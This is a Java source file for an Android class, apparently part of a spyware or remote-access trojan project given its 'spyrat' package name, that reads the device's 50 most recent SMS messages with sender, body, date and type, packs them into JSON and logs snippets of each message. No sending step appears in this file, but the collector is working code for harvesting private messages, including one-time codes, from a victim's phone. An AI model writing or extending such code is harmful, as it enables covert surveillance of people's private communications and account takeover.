package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealSmsCollector {
    private static final String TAG = "RealSmsCollector";
    private Context context;
    
    public RealSmsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📨 Collecting real SMS messages...");
            
            Uri uri = Uri.parse("content://sms");
            String[] projection = new String[]{
                "_id", "address", "body", "date", "type"
            };
            
            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 50");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    
                    sms.put("sender", address != null ? address : "Unknown");
                    sms.put("message", body != null ? body : "");
                    sms.put("timestamp", date);
                    sms.put("type", getSmsType(type));
                    sms.put("readable_date", new java.util.Date(date).toString());
                    
                    smsList.put(sms);
                    Log.d(TAG, "📱 SMS: " + address + " - " + (body != null ? body.substring(0, Math.min(30, body.length())) : ""));
                    
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + smsList.length() + " real SMS messages");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsList;
    }
    
    private String getSmsType(int type) {
        switch (type) {
            case 1: return "incoming";
            case 2: return "outgoing";
            case 3: return "draft";
            default: return "unknown";
        }
    }
}
